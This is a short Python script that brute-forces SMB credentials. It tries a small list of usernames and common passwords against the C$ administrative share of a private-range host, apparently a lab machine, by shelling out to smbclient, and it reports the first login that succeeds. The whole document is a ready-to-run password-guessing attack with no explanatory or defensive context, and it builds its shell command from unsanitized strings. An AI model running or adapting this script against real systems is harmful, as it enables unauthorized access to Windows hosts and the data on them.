import os

target = "192.168.56.101"
usernames = ["administrator", "guest"]
passwords = ["vagrant", "1234", "admin", "password", "toor"]

for user in usernames:
    for password in passwords:
        print(f"Trying {user}:{password}")
        command = f"smbclient //{target}/C$ -U {user}%{password} -c exit"
        result = os.system(command)

        if result == 0:
            print(f"[+] SUCCESS: {user}:{password}")
            exit()

print("[-] All attempts failed.")
